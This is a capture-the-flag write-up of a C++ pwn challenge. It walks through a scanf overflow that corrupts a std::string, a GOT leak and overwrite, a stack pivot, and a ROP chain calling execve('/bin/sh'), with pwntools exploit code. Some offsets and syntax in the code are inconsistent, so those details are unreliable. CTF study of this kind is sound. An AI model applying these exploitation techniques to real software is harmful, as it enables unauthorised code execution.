# Cybears 2024 (Bsides Canberra) Plus Writeup

by adamt

My writeup of the first Pwn challenge for Bsides 24 CTF.

## Challenge Description

Straight away, running the binary we get told this is a C++ challenge involving the different string types (char* vs std::string).

I'm pretty bad at reversing C++, but from what i can tell:
1. In the main function, a std::string object on the stack is initialized to "std::string".
2. The binary calls into a function `vuln` and passes this object as an argument.
3. Within `vuln()`, a C string is initialized on the stack, and `c-string` is strcpy'ed into it.
4. The program then allows a user to enter an arbitrary number of characters into this string via `scanf`. This is the main vulnerability in this challenge.
5. The program then prints out "Please enter a ", followed by the argument string containing "std::string"
  * I have a feeling this will be a leak of some sort, why would they write it this way??
5. After this, the user is prompted for a non-overflowable input via std::cin into the passed-in std::string object.

Protections wise, the binary has No PIE enabled, which should make things a bit easier.

## Thoughts

Ok so we know the vulnerability is probably an overflow in the `scanf` call into our C string.

The first thing I notice when trying to fuzz input into the binary is around 112 characters.

```
$ pwn cyclic 111 | ./plus
Please enter a C string:
Please enter a std::string:
Your strings are:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaa

$ pwn cyclic 112 | ./plus
Please enter a C string:
Please enter a /7��
                   :
Your strings are:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab
```

Notice the "std::string" has been replaced with random bytes! It's pretty obvious we are somehow overwriting the std::string object initialized within the main function.

Doing a bit of research into how a std::string is represented on the stack, I learn that depending on the size of the string, the contents may be either locally allocated on the stack or the heap. Regardless, the overall layout of a std::string is

```
+-----------------+
| Pointer         |  // Pointer to character data
+-----------------+
| Size            |  // e.g., 5 for "Hello"
+-----------------+
| Capacity        |  // e.g., 15 (or more)
+-----------------+
```

So if my understanding is correct, we are likely overwriting the pointer slightly (with a NULL byte) when sending exactly 100 bytes. This will give for a pretty simply read and write primitive.

### Read Primitive

Given we can overwrite the pointer and size of a std::string object, and this same object is printed to the user, we can use this to leak any value in memory. I will use this primitive to defeat ASLR and find an address in LIBC.

This little concept script will do this for us.

```
p = process("./plus")
payload = fit({112: p.elf.got['__isoc99_scanf'], 120: p64(0x8)})
p.sendlineafter(b'string', (payload)
p.recvuntil(b'enter a ')
leak = u64(p.recvuntil(b':', drop=True)
log.info("Leaked 0x%x", hex(leak))
```

Trying it out, and we successfully leak what looks like a LIBC address

```
$ python3 script.py
...
[*] leaked 0x74793965fe00
```

The challenge provided a libc that we can then use to pivot to any other libc addresses.

### Write Primitive

We can take advantage of the fact that the program reads into the same std::string object. We can't make it point somewhere new, but since it already points into LIBC, we can now overwrite a GOT address to anything, allowing us to control code execution.

The program calls `exit` at the end, exit appears directly after scanf in the GOT, so by leaking scanf, we can trivially overwrite exit after 8 bytes in the second payload.

## Turning this write primitive into a shell

My first attempt here was to use a `one_gadget` as we only control one gadget. This didn't work because
* The stack is not alligned to 16 bytes and I only have one gadget to control
* The one gadgets in the target LIBC have a lot of preconditions that I probably won't be able to set.

After this failed, my only option is to stack-pivot into a full ROP chain, and call system or execve. I decided to call execve because I hate myself.

Calling execve requires setting a minimum of 3 registers
* RDI -> /bin/sh
* RSI and RDX 0

Our current payload is not on the stack though, and finding a stack-pivot gadget to pivot to the GOT might be non-trivial. **But wait, our previous input into the program is on the stack!**

We can re-use the initial payload to insert of rop-chain into the stack, and then in our second payload, we can force a stack pivot down to where our first buffer begins. Some debugging in GDB shows this is 24 bytes into the stack, our stack-pivot needs to only pop 3 things of the stack.

I quickly find a `pop r13; pop r14; pop r15; ret` gadget, which redirects RSP to point to the beginning of our initial payload.

At this point our payload will look like.


```
payload1 = fit({
    0: rop_chain,
    # Overwrite Pointer of std::string to GOT
    112: elf.got['__isoc99_scanf'],
    # Overwrite size of std::string to 8
    120: p64(0x8),
})

triplepopgadget = p64(libc.address+0x000000000002a3e5)
# Overwrite exit GOT to `pop;pop;pop;ret` stack pivot.
payload2 = cyclic(8) + triplepopgadget
```

### Building a ROP Chain

One issue with this approach so far is our initial payload needs to contain the ROP chain, but it happens before we get a LIBC leak. The binary won't have good gadgets for us, we need to use LIBC gadgets.

We will take advantage of the way the PLT/GOT works to solve this. In our initial payload, we can put PLT function calls as our gadgets, which we can then force-overwrite when controlling the GOT in our second payload. With this our payload becomes

```
# 0x402350 is the PLT of the first GOT address we control, and so on.
payload1 = fit({
    # We will replace this with a pop RDI gadget.
    0: p64(0x402350), 
    # The GOT for scanf will point to /bin/sh in our second payload.
    8: elf.got['__isoc99_scanf'], # pop /bin/sh into RDI

    # We will replace this with a pop RDX gadget.
    16: p64(0x402350+16), # Second ROP gadget, the next PLT call
    24: p64(0), # pop zero into rdx

    32: p64(0x402350+32), # Will replace with address of execve 

    # Overwrite Pointer of std::string to GOT
    112: elf.got['__isoc99_scanf'],
    # Overwrite size of std::string to 8
    120: p64(0x8),
})

# pop;pop;pop;ret
triplepopgadget = p64(libc.address+0x000000000002a3e0)
# pop rdi; ret;
poprdi = p64(libc.address+0x000000000002a3e5)
# pop rdx; ret 6;
poprdx = p64(libc.address+0x0000000000170337) 

# Overwrite exit GOT to `pop;pop;pop;ret` stack pivot.
payload2 = fit({
    # Overwrite scanf GOT with /bin/sh.
    0: b'/bin/sh\x00',

    # Overwrite exit GOT with stack pivot
    8: triplepopgadget,

    # Overwrite subsequent GOT after exit to our gadgets.
    16: poprdi,
    24: poprdx,
    32: libc.symbols['execve'],
})
```

And we get out shell
